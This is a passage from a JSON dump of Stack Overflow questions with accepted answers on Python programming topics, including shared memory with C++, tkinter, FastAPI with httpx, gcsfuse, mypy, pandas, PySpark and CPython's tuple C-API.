    "Body": "I'm trying to connect a C++ program to python using shared memory but I don't know how to pass the name of the memory segment to python.\nHere is my C++ code:\nkey_t key = ftok(\"address\", 1);\nint shm_o;\nchar* msg = \"hello there\";\nint len = strlen(msg) + 1;\nvoid* addr;\n\nshm_o = shmget(key, 20, IPC_CREAT | 0600);\nif(shm_o == -1)\n{\n    std::cout << \"Failed: shmget.\\n\";\n    return 1;\n}\n\naddr = shmat(shm_o, NULL, 0);\nif(addr == (void*) -1)\n{\n    std::cout << \"Failed: shmat.\\n\";\n    return 1;\n}\n\nstd::cout << \"Shared memory segment created successfully with id: \" << shm_o;\nmemcpy(addr, msg, len);\n\ngetchar();\nreturn 0;\n\nI'm trying to get python to read from the shared memory segment like so:\nshm_a = shared_memory.SharedMemory(name=\"address\", create=False, size=20)\n\nprint(bytes(shm_a.buf[:11]))\n\nbut it throws an exception saying there is no file or directory called 'address'.\nAm I going about this correctly or is there another way to attach python to the shared memory segment?\nAny help would be much appreciated.\n",
    "AcceptedAnswerId": 73720808,
    "AcceptedAnswer": "Taking the liberty to post a working example here for POSIX shared memory segments, which will work across C/C++ and Python on Linux/UNIX-like systems. This will not work on Windows.\nC++ code to create and write data into a shared memory segment (name provided on command line):\n#include \n#include \n#include \n#include \n#include \n\n#include \n#include \n\nint main(int argc, char * argv[])\n{\n    if (argc != 2) {\n         std::cerr  required\" << std::endl;\n         return 1;\n    }\n    const char * shmem_name = argv[1];\n    size_t shm_size = 4096;\n    int shmem_fd = shm_open(shmem_name, O_CREAT|O_RDWR, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP);\n    if (shmem_fd == -1) {\n         perror(\"shm_open\");\n         return 1;\n    }\n    std::cout << \"Shared Memory segment created with fd \" << shmem_fd << std::endl;\n    if (ftruncate(shmem_fd, shm_size) == -1) {\n        perror(\"ftruncate\");\n        return 1;\n    }\n    std::cout << \"Shared Memory segment resized to \" << shm_size << std::endl;\n    void * addr = mmap(0, shm_size, PROT_WRITE, MAP_SHARED, shmem_fd, 0);\n    if (addr == MAP_FAILED) {\n        perror(\"mmap\");\n        return 1;\n    }\n    std::cout << \"Please enter some text to write to shared memory segment\\n\";\n    std::string text;\n    std::getline(std::cin, text);\n    while (! text.empty()) {\n        strncpy((char *)addr, text.data(), shm_size);\n        std::cout << \"Written '\" << text << \"' to shared memory segment\\n\";\n        std::getline(std::cin, text);\n    }\n    std::cout << \"Unlinking shared memory segment.\" << std::endl;\n    shm_unlink(shmem_name) ;\n}\n\nPython code to read any string from the beginning of the shared memory segment:\nimport sys\nfrom multiprocessing import shared_memory, resource_tracker\n\nif len(sys.argv) != 2:\n    print(\"Argument  required\")\n    sys.exit(1)\n\nshm_seg = shared_memory.SharedMemory(name=sys.argv[1])\nprint(bytes(shm_seg.buf).strip(b'\\x00').decode('ascii'))\nshm_seg.close()\n# Manually remove segment from resource_tracker, otherwise shmem segment\n# will be unlinked upon program exit\nresource_tracker.unregister(shm_seg._name, \"shared_memory\")\n\n"
}
{
    "Id": 73566474,
    "PostTypeId": 1,
    "Title": "Unable to locate package python-openssl",
    "Body": "I'm trying to install Pyenv, and I'm running on Ubuntu 22.04 LTS. but whenever I run this command\nsudo apt install -y make build-essential libssl-dev zlib1g-dev \\ libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev \\ libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl \\ git\n\nI get this error\nUnable to locate package python-openssl\n\nI've tried searching for solutions online, but I think they have encountered it on older versions of Ubuntu and not on the latest version.\n",
    "AcceptedAnswerId": 73566675,
    "AcceptedAnswer": "Make sure your list of packages is updated (sudo apt update). Python openssl bindings are available in 22.04 in python3-openssl (link), so you can install it by running\nsudo apt install python3-openssl\n\n"
}
{
    "Id": 74370984,
    "PostTypeId": 1,
    "Title": "Is tkwait wait_variable/wait_window/wait_visibility broken?",
    "Body": "I recently started to use tkwait casually and noticed that some functionality only works under special conditions. For example:\nimport tkinter as tk\n\ndef w(seconds):\n    dummy = tk.Toplevel(root)\n    dummy.title(seconds)\n    dummy.after(seconds*1000, lambda x=dummy: x.destroy())\n    dummy.wait_window(dummy)\n    print(seconds)\n\nroot = tk.Tk()\nfor i in [5,2,10]:\n    w(i)\nroot.mainloop()\n\nThe code above works just fine and as expected:\n\nThe for loop calls the function\nThe function runs and blocks the code for x seconds\nThe window gets destroyed and the for loop continues\n\nBut in a more event driven environment these tkwait calls gets tricky. The documentation states quote:\n\nIf an event handler invokes tkwait again, the nested call to tkwait\nmust complete before the outer call can complete.\n\nInstead of an output of >>5 >>2 >>10 you will get >>10 >>2 >>5 because the nested call blocks the inner and the outer will block the inner. I suspect a nested event loop or an equivalent of the mainloop processes events in the normal fashion while waiting.\nAm I doing something wrong by using this feature? Because if you think about it, nearly all tkinter dialog windows are using this feature and I've never read about this behavior before.\nAn event driven example might be:\nimport tkinter as tk\n\ndef w(seconds):\n    dummy = tk.Toplevel(root)\n    dummy.title(seconds)\n    dummy.after(seconds*1000, lambda x=dummy: x.destroy())\n    dummy.wait_window(dummy)\n    print(seconds)\n\nroot = tk.Tk()\nbtn1 = tk.Button(\n    root, command=lambda : w(5), text = '5 seconds')\nbtn2 = tk.Button(\n    root, command=lambda : w(2), text = '2 seconds')\nbtn3 = tk.Button(\n    root, command=lambda : w(10), text = '10 seconds')\nbtn1.pack()\nbtn2.pack()\nbtn3.pack()\nroot.mainloop()\n\nAs an additional problem that raises with wait_something is that it will prevent your process to finish if the wait_something never was released.\n",
    "AcceptedAnswerId": 74376258,
    "AcceptedAnswer": "Basically, you need great care if you're using an inner event loop because:\n\nConditions that would terminate the outer event loop aren't checked for until the inner event loop(s) are finished.\nIt's really quite easy to end up recursively entering an inner event loop by accident.\n\nThe recursive entry problem is usually most easily handled by disabling the path that enters the event loop while the inner event loop runs. There's often an obvious way to do this, such as disabling the button that you'd click.\nThe condition handling is rather more difficult. In Tcl, you'd handle it by restructuring things slightly using a coroutine so that the thing that looks like an inner event loop isn't, but rather is just parking things until the condition is satisfied. That option is... rather more difficult to do in Python as the language implementation isn't fully non-recursive (and I'm not sure that Tkinter is set up to handle the mess of async function coloring). Fortunately, provided you're careful, it's not too difficult.\nIt helps if you know that wait_window is waiting for a  event where the target window is the toplevel (and not one of the inner components) and that destroying the main window will trigger it as all the other windows are also destroyed when you do that. In short, as long as you avoid reentrancy you'll be fine with it. You just need to arrange for the button that was clicked to be disabled while the wait is ongoing; that's good from a UX perspective too (the user can't do it, so don't provide the visual hint that they can).\ndef w(seconds, button):\n    dummy = tk.Toplevel(root)\n    dummy.title(seconds)\n    dummy.after(seconds*1000, lambda x=dummy: x.destroy())\n    button[\"state\"] = \"disabled\"  # <<< This, before the wait\n    dummy.wait_window(dummy)\n    button[\"state\"] = \"normal\"    # <<< This, after the wait\n    print(seconds)\n\nbtn1 = tk.Button(root, text = '5 seconds')\n# Have to set the command after creation to bind the button handle to the callback\nbtn1[\"command\"] = (lambda : w(5, btn1))\n\nThis all omits little things like error handling.\n"
}
{
    "Id": 71031816,
    "PostTypeId": 1,
    "Title": "how do you properly reuse an httpx.AsyncClient wihtin a FastAPI application?",
    "Body": "I have a FastAPI application which, in several different occasions, needs to call external APIs. I use httpx.AsyncClient for these calls. The point is that I don't fully understand how I shoud use it.\nFrom httpx' documentation I should use context managers,\nasync def foo():\n    \"\"\"\"\n    I need to call foo quite often from different \n    parts of my application\n    \"\"\"\n    async with httpx.AsyncClient() as aclient:\n        # make some http requests, e.g.,\n        await aclient.get(\"http://example.it\")\n\nHowever, I understand that in this way a new client is spawned each time I call foo(), and is precisely what we want to avoid by using a client in the first place.\nI suppose an alternative would be to have some global client defined somewhere, and just import it whenever I need it like so\naclient = httpx.AsyncClient()\n\nasync def bar():\n    # make some http requests using the global aclient, e.g.,\n    await aclient.get(\"http://example.it\")\n\nThis second option looks somewhat fishy, though, as nobody is taking care of closing the session and the like.\nSo the question is: how do I properly (re)use httpx.AsyncClient() within a FastAPI application?\n",
    "AcceptedAnswerId": 74397436,
    "AcceptedAnswer": "You can have a global client that is closed in the FastApi shutdown event.\nimport logging\nfrom fastapi import FastAPI\nimport httpx\n\nlogging.basicConfig(level=logging.INFO, format=\"%(levelname)-9s %(asctime)s - %(name)s - %(message)s\")\nLOGGER = logging.getLogger(__name__)\n\n\nclass HTTPXClientWrapper:\n\n    async_client = None\n\n    def start(self):\n        \"\"\" Instantiate the client. Call from the FastAPI startup hook.\"\"\"\n        self.async_client = httpx.AsyncClient()\n        LOGGER.info(f'httpx AsyncClient instantiated. Id {id(self.async_client)}')\n\n    async def stop(self):\n        \"\"\" Gracefully shutdown. Call from FastAPI shutdown hook.\"\"\"\n        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed} - Now close it. Id (will be unchanged): {id(self.async_client)}')\n        await self.async_client.aclose()\n        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed}. Id (will be unchanged): {id(self.async_client)}')\n        self.async_client = None\n        LOGGER.info('httpx AsyncClient closed')\n\n    def __call__(self):\n        \"\"\" Calling the instantiated HTTPXClientWrapper returns the wrapped singleton.\"\"\"\n        # Ensure we don't use it if not started / running\n        assert self.async_client is not None\n        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed}. Id (will be unchanged): {id(self.async_client)}')\n        return self.async_client\n\n\nhttpx_client_wrapper = HTTPXClientWrapper()\napp = FastAPI()\n\n\n@app.get('/test-call-external')\nasync def call_external_api(url: str = 'https://stackoverflow.com'):\n    async_client = httpx_client_wrapper()\n    res = await async_client.get(url)\n    result = res.text\n    return {\n        'result': result,\n        'status': res.status_code\n    }\n\n\n@app.on_event(\"startup\")\nasync def startup_event():\n    httpx_client_wrapper.start()\n\n\n@app.on_event(\"shutdown\")\nasync def shutdown_event():\n    await httpx_client_wrapper.stop()\n\n\nif __name__ == '__main__':\n    import uvicorn\n    LOGGER.info(f'starting...')\n    uvicorn.run(f\"{__name__}:app\", host=\"127.0.0.1\", port=8000)\n\n\n\nNote - this answer was inspired by a similar answer I saw elsewhere a long time ago for aiohttp, I can't find the reference but thanks to whoever that was!\nEDIT\nI've added uvicorn bootstrapping in the example so that it's now fully functional. I've also added logging to show what's going on on startup and shutdown, and you can visit localhost:8000/docs to trigger the endpoint and see what happens (via the logs).\nThe reason for calling the start() method from the startup hook is that by the time the hook is called the eventloop has already started, so we know we will be instantiating the httpx client in an async context.\nAlso I was missing the async on the stop() method, and had a self.async_client = None instead of just async_client = None, so I have fixed those errors in the example.\n"
}
{
    "Id": 73722570,
    "PostTypeId": 1,
    "Title": "Unable to write files in a GCP bucket using gcsfuse",
    "Body": "I have mounted a storage bucket on a VM using the command:\ngcsfuse my-bucket /path/to/mount\n\nAfter this I'm able to read files from the bucket in Python using Pandas, but I'm not able to write files nor create new folders. I have tried with Python and from the terminal using sudo but get the same error.\nI have also tried Using the key_file from the bucket:\nsudo mount -t gcsfuse -o implicit_dirs,allow_other,uid=1000,gid=1000,key_file=Notebooks/xxxxxxxxxxxxxx10b3464a1aa9.json  \n\nIt does not through errors when I run the code, but still I'm not able to write in the bucket.\nI have also tried:\ngcloud auth login\n\nBut still have the same issue.\n",
    "AcceptedAnswerId": 73764622,
    "AcceptedAnswer": "I ran into the same thing a while ago, which was really confusing. You have to set the correct access scope for the virtual machine so that anyone using the VM is able to call the storage API. The documentation shows that the default access scope for storage on a VM is read-only:\n\nWhen you create a new Compute Engine instance, it is automatically\nconfigured with the following access scopes:\n\nRead-only access to Cloud Storage:\nhttps://www.googleapis.com/auth/devstorage.read_only\n\n\nAll you have to do is change this scope so that you are also able to write to storage buckets from the VM. You can find an overview of different scopes here. To apply the new scope to your VM, you have to first shut it down. Then from your local machine execute the following command:\ngcloud compute instances set-scopes INSTANCE_NAME \\\n  --scopes=storage-rw \\\n  --zone=ZONE\n\nYou can do the same thing from the portal if you go to the settings of your VM, scroll all the way down, and choose \"Set Access for each API\". You have the same options when you create the VM for the first time. Below is an example of how you would do this:\n\n"
}
{
    "Id": 73572941,
    "PostTypeId": 1,
    "Title": "Writing style to prevent string concatenation in a list of strings",
    "Body": "Suppose I have a list/tuple of strings,\nCOLOURS = [\n    \"White\",\n    \"Black\",\n    \"Red\"\n    \"Green\",\n    \"Blue\"\n]\n\nfor c in COLOURS:\n    # rest of the code\n\nSometimes I forget placing a comma after each entry in the list (\"Red\" in the above snippet). This results in one \"RedGreen\" instead of two separate \"Red\" and \"Green\" list items.\nSince this is valid Python, no IDE/text editor shows a warning/error. The incorrect value comes to the limelight only during testing.\nWhat writing style or code structure should I use to prevent this?\n",
    "AcceptedAnswerId": 73588070,
    "AcceptedAnswer": "You're incorrect that \"no IDE/text editor shows a warning/error\". Pylint can identify this problem using rule implicit-str-concat (W1404) with flag check-str-concat-over-line-jumps. (And for that matter, there are lots of things that are valid Python that a linter will warn you about, like bare except: for example.)\nPersonally, I'm using VSCode, so I enabled Pylint via the Python extension (python.linting.pylintEnabled) and set up a pylintrc like this:\n[tool.pylint]\ncheck-str-concat-over-line-jumps = yes\n\nNow VSCode gives this warning for your list:\n\nImplicit string concatenation found in list\u00a0 pylint(implicit-str-concat)\u00a0 [Ln 4, Col 1]\n\n\nLastly, there are probably other linters that can find the same problem, but Pylint is the first one I found.\n"
}
{
    "Id": 73603289,
    "PostTypeId": 1,
    "Title": "Why doesn't parameter type \"Dict[str, Union[str, int]]\" accept value of type \"Dict[str, str]\" (mypy)",
    "Body": "I have a type for a dictionary of variables passed to a template:\nVariablesDict = Dict[str, Union[int, float, str, None]]\n\nBasically, any dictionary where the keys are strings and the values are strings, numbers or None. I use this type in several template related functions.\nTake this example function:\ndef render_template(name: str, variables: VariablesDict):\n    ...\n\nCalling this function with a dictionary literal works fine:\nrender_template(\"foo\", {\"key\": \"value\"})\n\nHowever, if I assign the dictionary to a variable first, like this:\nvariables = {\"key\": \"value\"}\n\nrender_template(\"foo\", variables)\n\nMypy gives an error:\n\nArgument 2 to \"render_template\" has incompatible type \"Dict[str, str]\"; expected \"Dict[str, Union[int, float, str, None]]\"\n\nIt seems to me that any value of type Dict[str, str] should be safe to pass to a function that expects a parameter of type Dict[str, Union[int, float, str, None]]. Why doesn't that work by default? Is there anything I can do to make this work?\n",
    "AcceptedAnswerId": 73603324,
    "AcceptedAnswer": "The reason it doesn't work is that Dict is mutable, and a function which accepts a Dict[str, int|float|str|None] could therefore reasonably insert any of those types into its argument.  If the argument was actually a Dict[str, str], it now contains values that violate its type.  (For more on this, google \"covariance/contravariance/invariance\" and \"Liskov Substitution Principle\" -- as a general rule, mutable containers are invariant over their generic type[s].)\nAs long as render_template doesn't need to modify the dict you pass to it, an easy fix is to have it take a Mapping (which is an abstract supertype of dict that doesn't imply mutability, and is therefore covariant) instead of a Dict:\ndef render_template(name: str, variables: Mapping[str, Union[int, float, str, None]]):\n    ...\n\n"
}
{
    "Id": 74401537,
    "PostTypeId": 1,
    "Title": "Pandas groupby two columns and expand the third",
    "Body": "I have a Pandas dataframe with the following structure:\nA       B       C\na       b       1\na       b       2\na       b       3\nc       d       7\nc       d       8\nc       d       5\nc       d       6\nc       d       3\ne       b       4\ne       b       3\ne       b       2\ne       b       1\n\nAnd I will like to transform it into this:\nA       B       C1      C2      C3      C4      C5\na       b       1       2       3       NAN     NAN\nc       d       7       8       5       6       3\ne       b       4       3       2       1       NAN\n\nIn other words, something like groupby A and B and expand C into different columns.\nKnowing that the length of each group is different.\nC is already ordered\nShorter groups can have NAN or NULL values (empty), it does not matter.\n",
    "AcceptedAnswerId": 74401567,
    "AcceptedAnswer": "Use GroupBy.cumcount and pandas.Series.add with 1, to start naming the new columns from 1 onwards, then pass this to DataFrame.pivot, and add DataFrame.add_prefix to rename the columns (C1, C2, C3, etc...). Finally use DataFrame.rename_axis to remove the indexes original name ('g') and transform the MultiIndex into columns by using DataFrame.reset_indexcolumns A,B:\ndf['g'] = df.groupby(['A','B']).cumcount().add(1)\n\ndf = df.pivot(['A','B'], 'g', 'C').add_prefix('C').rename_axis(columns=None).reset_index()\nprint (df)\n   A  B   C1   C2   C3   C4   C5\n0  a  b  1.0  2.0  3.0  NaN  NaN\n1  c  d  7.0  8.0  5.0  6.0  3.0\n2  e  b  4.0  3.0  2.0  1.0  NaN\n\nBecause NaN is by default of type float, if you need the columns dtype to be integers add DataFrame.astype with Int64:\ndf['g'] = df.groupby(['A','B']).cumcount().add(1)\n\ndf = (df.pivot(['A','B'], 'g', 'C')\n        .add_prefix('C')\n        .astype('Int64')\n        .rename_axis(columns=None)\n        .reset_index())\nprint (df)\n   A  B  C1  C2  C3    C4    C5\n0  a  b   1   2   3    \n1  c  d   7   8   5     6     3\n2  e  b   4   3   2     1  \n\nEDIT: If there's a maximum N new columns to be added, it means that A,B are duplicated. Therefore, it will beneeded to add helper groups g1, g2 with integer and modulo division, adding a new level in index:\nN = 4\ng  = df.groupby(['A','B']).cumcount()\ndf['g1'], df['g2'] = g // N, (g % N) + 1\ndf = (df.pivot(['A','B','g1'], 'g2', 'C')\n        .add_prefix('C')\n        .droplevel(-1)\n        .rename_axis(columns=None)\n        .reset_index())\nprint (df)\n   A  B   C1   C2   C3   C4\n0  a  b  1.0  2.0  3.0  NaN\n1  c  d  7.0  8.0  5.0  6.0\n2  c  d  3.0  NaN  NaN  NaN\n3  e  b  4.0  3.0  2.0  1.0 \n\n"
}
{
    "Id": 73739552,
    "PostTypeId": 1,
    "Title": "Select columns from a highly nested data",
    "Body": "For the dataframe below, which was generated from an avro file, I'm trying to get the column names as a list or other format so that I can use it in a select statement. node1 and node2 have the same elements. For example I understand that we could do df.select(col('data.node1.name')), but I'm not sure\n\nhow to select all columns at once without hardcode all the column names, and\nhow to handle the nested part. I think to make it readable, the productvalues and porders should be selected into separate individual dataframes/tables?\n\nInput schema:\nroot\n  |-- metadata: struct\n  |...\n  |-- data :struct \n  |    |--node1 : struct\n  |    |   |--name : string\n  |    |   |--productlist: array\n  |    |        |--element : struct\n       |              |--productvalues: array\n       |                   |--element : struct\n       |                         |-- pname:string\n       |                         |-- porders:array\n       |                                |--element : struct\n       |                                      |-- ordernum: int\n       |                                      |-- field: string\n       |--node2 : struct\n  |        |--name : string\n  |        |--productlist: array\n  |             |--element : struct\n                      |--productvalues: array\n                          |--element : struct\n                                 |-- pname:string\n                                 |-- porders:array\n                                        |--element : struct\n                                              |-- ordernum: int\n                                              |-- field: string\n\n",
    "AcceptedAnswerId": 73784939,
    "AcceptedAnswer": "The following way, you will not need to hardcode all the struct fields. But you will need to provide a list of those columns/fields which have the type of array of struct. You have 3 of such fields, we will add one more column, so in total it will be 4.\nFirst of all, the dataframe, similar to yours:\nfrom pyspark.sql import functions as F\n\ndf = spark.createDataFrame(\n    [(\n        ('a', 'b'),\n        (\n            (\n                'name_1',\n                [\n                    ([\n                        (\n                            'pname_111',\n                            [\n                                (1111, 'field_1111'),\n                                (1112, 'field_1112')\n                            ]\n                        ),\n                        (\n                            'pname_112',\n                            [\n                                (1121, 'field_1121'),\n                                (1122, 'field_1122')\n                            ]\n                        )\n                    ],),\n                    ([\n                        (\n                            'pname_121',\n                            [\n                                (1211, 'field_1211'),\n                                (1212, 'field_1212')\n                            ]\n                        ),\n                        (\n                            'pname_122',\n                            [\n                                (1221, 'field_1221'),\n                                (1222, 'field_1222')\n                            ]\n                        )\n                    ],)\n                ]\n            ),\n            (\n                'name_2',\n                [\n                    ([\n                        (\n                            'pname_211',\n                            [\n                                (2111, 'field_2111'),\n                                (2112, 'field_2112')\n                            ]\n                        ),\n                        (\n                            'pname_212',\n                            [\n                                (2121, 'field_2121'),\n                                (2122, 'field_2122')\n                            ]\n                        )\n                    ],),\n                    ([\n                        (\n                            'pname_221',\n                            [\n                                (2211, 'field_2211'),\n                                (2212, 'field_2212')\n                            ]\n                        ),\n                        (\n                            'pname_222',\n                            [\n                                (2221, 'field_2221'),\n                                (2222, 'field_2222')\n                            ]\n                        )\n                    ],)\n                ]\n            )\n        ),\n    )],\n    'metadata:struct, data:struct>>>>>>, node2:struct>>>>>>>'\n)\n\n# df.printSchema()\n# root\n#  |-- metadata: struct (nullable = true)\n#  |    |-- fld1: string (nullable = true)\n#  |    |-- fld2: string (nullable = true)\n#  |-- data: struct (nullable = true)\n#  |    |-- node1: struct (nullable = true)\n#  |    |    |-- name: string (nullable = true)\n#  |    |    |-- productlist: array (nullable = true)\n#  |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |-- productvalues: array (nullable = true)\n#  |    |    |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |    |    |-- pname: string (nullable = true)\n#  |    |    |    |    |    |    |-- porders: array (nullable = true)\n#  |    |    |    |    |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |    |    |    |    |-- ordernum: integer (nullable = true)\n#  |    |    |    |    |    |    |    |    |-- field: string (nullable = true)\n#  |    |-- node2: struct (nullable = true)\n#  |    |    |-- name: string (nullable = true)\n#  |    |    |-- productlist: array (nullable = true)\n#  |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |-- productvalues: array (nullable = true)\n#  |    |    |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |    |    |-- pname: string (nullable = true)\n#  |    |    |    |    |    |    |-- porders: array (nullable = true)\n#  |    |    |    |    |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |    |    |    |    |-- ordernum: integer (nullable = true)\n#  |    |    |    |    |    |    |    |    |-- field: string (nullable = true)\n\nThe answer\n\nSpark 3.1+\nnodes = df.select(\"data.*\").columns\nfor n in nodes:\n    df = df.withColumn(\"data\", F.col(\"data\").withField(n, F.struct(F.lit(n).alias(\"node\"), f\"data.{n}.*\")))\ndf = df.withColumn(\"data\", F.array(\"data.*\"))\n\nfor arr_of_struct in [\"data\", \"productlist\", \"productvalues\", \"porders\"]:\n    df = df.select(\n        *[c for c in df.columns if c != arr_of_struct],\n        F.expr(f\"inline({arr_of_struct})\")\n    )\n\n\nLower Spark versions:\nnodes = df.select(\"data.*\").columns\nfor n in nodes:\n    df = df.withColumn(\n        \"data\",\n        F.struct(\n            F.struct(F.lit(n).alias(\"node\"), f\"data.{n}.*\").alias(n),\n            *[f\"data.{c}\" for c in df.select(\"data.*\").columns if c != n]\n        )\n    )\ndf = df.withColumn(\"data\", F.array(\"data.*\"))\n\nfor arr_of_struct in [\"data\", \"productlist\", \"productvalues\", \"porders\"]:\n    df = df.select(\n        *[c for c in df.columns if c != arr_of_struct],\n        F.expr(f\"inline({arr_of_struct})\")\n    )\n\n\n\nResults:\ndf.printSchema()\n# root\n#  |-- metadata: struct (nullable = true)\n#  |    |-- fld1: string (nullable = true)\n#  |    |-- fld2: string (nullable = true)\n#  |-- node: string (nullable = false)\n#  |-- name: string (nullable = true)\n#  |-- pname: string (nullable = true)\n#  |-- ordernum: integer (nullable = true)\n#  |-- field: string (nullable = true)\n\ndf.show()\n# +--------+-----+------+---------+--------+----------+\n# |metadata| node|  name|    pname|ordernum|     field|\n# +--------+-----+------+---------+--------+----------+\n# |  {a, b}|node1|name_1|pname_111|    1111|field_1111|\n# |  {a, b}|node1|name_1|pname_111|    1112|field_1112|\n# |  {a, b}|node1|name_1|pname_112|    1121|field_1121|\n# |  {a, b}|node1|name_1|pname_112|    1122|field_1122|\n# |  {a, b}|node1|name_1|pname_121|    1211|field_1211|\n# |  {a, b}|node1|name_1|pname_121|    1212|field_1212|\n# |  {a, b}|node1|name_1|pname_122|    1221|field_1221|\n# |  {a, b}|node1|name_1|pname_122|    1222|field_1222|\n# |  {a, b}|node2|name_2|pname_211|    2111|field_2111|\n# |  {a, b}|node2|name_2|pname_211|    2112|field_2112|\n# |  {a, b}|node2|name_2|pname_212|    2121|field_2121|\n# |  {a, b}|node2|name_2|pname_212|    2122|field_2122|\n# |  {a, b}|node2|name_2|pname_221|    2211|field_2211|\n# |  {a, b}|node2|name_2|pname_221|    2212|field_2212|\n# |  {a, b}|node2|name_2|pname_222|    2221|field_2221|\n# |  {a, b}|node2|name_2|pname_222|    2222|field_2222|\n# +--------+-----+------+---------+--------+----------+\n\nExplanation\nnodes = df.select(\"data.*\").columns\nfor n in nodes:\n    df = df.withColumn(\"data\", F.col(\"data\").withField(n, F.struct(F.lit(n).alias(\"node\"), f\"data.{n}.*\")))\n\nUsing the above, I decided to save the node title in case you need it.\nIt first gets a list of nodes from \"data\" column fields. Using the list, the for loop creates one more field inside every node struct for the title of the node.\ndf = df.withColumn(\"data\", F.array(\"data.*\"))\n\nThe above converts the \"data\" column type from struct to array so that in the next step we could easily explode it into columns.\nfor arr_of_struct in [\"data\", \"productlist\", \"productvalues\", \"porders\"]:\n    df = df.select(\n        *[c for c in df.columns if c != arr_of_struct],\n        F.expr(f\"inline({arr_of_struct})\")\n    )\n\nIn the above, the main line is F.expr(f\"inline({arr_of_struct})\"). It must be used inside a loop, because it's a generator and you cannot nest them together in Spark. inline explodes arrays of structs into columns. At this step you have 4 of [array of struct], so 4 inline expressions will be created.\n"
}
{
    "Id": 74405180,
    "PostTypeId": 1,
    "Title": "Why cpython exposes 'PyTuple_SetItem' as C-API if tuple is immutable by design?",
    "Body": "Tuple in python is immutable by design, so if we try to mutate a tuple object python emits following TypeError which make sense.\n>>> a = (1, 2, 3)\n>>> a[0] = 12\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: 'tuple' object does not support item assignment\n\nSo my question is, if tuple is immutable by design why cpython exposes PyTuple_SetItem as C-API?.\nFrom the documentation it's described as\n\nint PyTuple_SetItem(PyObject *p, Py_ssize_t pos, PyObject *o)\nInsert a reference to object o at position pos of the tuple pointed to\nby p. Return 0 on success. If pos is out of bounds, return -1 and set\nan IndexError exception.\n\nIsn't this statement exactly equal to tuple[index] = value in python layer?. If the goal was to create a tuple from collection of items we could have use PyTuple_Pack.\nAdditional note:\nAfter lot of trial and error with ctypes.pythonapi I managed to mutate tuple object using PyTuple_SetItem\nimport ctypes\n\nfrom ctypes import py_object\n\nmy_tuple = (1, 2, 3)\nnewObj = py_object(my_tuple)\n\nm = \"hello\"\n\n# I don't know why I need to Py_DecRef here. \n# Although to reproduce this in your system,  no of times you have \n# to do `Py_DecRef` depends on no of ref count of `newObj` in your system\nctypes.pythonapi.Py_DecRef(newObj)\nctypes.pythonapi.Py_DecRef(newObj)\nctypes.pythonapi.Py_DecRef(newObj)\n\nctypes.pythonapi.Py_IncRef(m)\n\n\n\nPyTuple_SetItem = ctypes.pythonapi.PyTuple_SetItem\nPyTuple_SetItem.argtypes = ctypes.py_object, ctypes.c_size_t, ctypes.py_object\n\nPyTuple_SetItem(newObj, 0, m)\nprint(my_tuple) # this will print `('hello', 2, 3)`\n\n",
    "AcceptedAnswerId": 74405544,
    "AcceptedAnswer": "Similarly, there is a PyTuple_Resize function with the warning\n\nBecause tuples are supposed to be immutable, this should only be used\nif there is only one reference to the object. Do not use this if the\ntuple may already be known to some other part of the code. The tuple\nwill always grow or shrink at the end. Think of this as destroying the\nold tuple and creating a new one, only more efficiently.\n\nLooking at the source, there is a guard on the function\nif (!PyTuple_Check(op) || Py_REFCNT(op) != 1) {\n    .... error ....\n\nSure enough, this is only allowed when there is only 1 reference to the tuple - that reference being the thing that thinks its a good idea to change it. So, a tuple is \"mostly immutable\" but C code can change it in limited circumstances to avoid the penalty of creating a new tuple.\n"
}
{
    "Id": 74550830,
    "PostTypeId": 1,
    "Title": "ERROR: Could not build wheels for aiohttp, which is required to install pyproject.toml-based projects",
    "Body": "Python version: 3.11\nInstalling dependencies for an application by pip install -r requirements.txt gives the following error:\nsocket.c -o build/temp.linux-armv8l-cpython-311/aiohttp/_websocket.o\naiohttp/_websocket.c:198:12: fatal error: 'longintrepr.h' file not found\n#include \"longintrepr.h\"                                   \n          ^~~~~~~                        1 error generated.\nerror: command '/data/data/com.termux/files/usr/bin/arm-linux-androideabi-clang' \nfailed with exit code 1\n[end of output]\nnote: This error originates from a subprocess, and is likely not a problem with pip.\nERROR: Failed building wheel for aiohttp\nFailed to build aiohttp\nERROR: Could not build wheels for aiohttp, which is required to install\npyproject.toml-based projects\n\nThis error is specific to Python 3.11 version. On Python with 3.10.6 version installation goes fine.\nRelated question: yarl/_quoting.c:196:12: fatal error: 'longintrepr.h' file not found - 1 error generated\n",
    "AcceptedAnswerId": 74550831,
    "AcceptedAnswer": "Solution for this error: need to update requirements.txt.\nNot working versions of modules with Python 3.11:\naiohttp==3.8.1\nyarl==1.4.2\nfrozenlist==1.3.0\n\nWorking versions:\naiohttp==3.8.2\nyarl==1.8.1\nfrozenlist==1.3.1\n\nLinks to the corresponding issues with fixes:\n\nhttps://github.com/aio-libs/aiohttp/issues/6600\nhttps://github.com/aio-libs/yarl/issues/706\nhttps://github.com/aio-libs/frozenlist/issues/305\n\n"
}
{
    "Id": 73711633,
    "PostTypeId": 1,
    "Title": "How to calculate and store results based upon the Matching Rows of two different Pandas Dataframes in Python",
